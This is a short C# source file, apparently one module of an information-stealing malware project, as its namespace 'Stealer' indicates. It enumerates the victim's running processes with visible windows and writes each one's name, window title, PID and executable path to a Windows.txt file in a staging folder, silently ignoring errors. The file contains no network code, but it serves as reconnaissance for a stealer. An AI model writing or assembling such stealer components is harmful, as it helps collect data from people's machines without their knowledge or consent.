using System.Diagnostics;

namespace Stealer
{
    internal sealed class ActiveWindows
    {
        public static void WriteWindows(string sSavePath)
        {
            Process[] processlist = Process.GetProcesses();
            foreach (Process process in processlist)
                try
                {
                    if (!string.IsNullOrEmpty(process.MainWindowTitle))
                        System.IO.File.AppendAllText(
                            sSavePath + "\\Windows.txt",
                            "NAME: " + process.ProcessName +
                            "\n\tTITLE: " + process.MainWindowTitle +
                            "\n\tPID: " + process.Id +
                            "\n\tEXE: " + ProcessList.ProcessExecutablePath(process) +
                            "\n\n"
                        );
                } catch { }
        }
    }
}
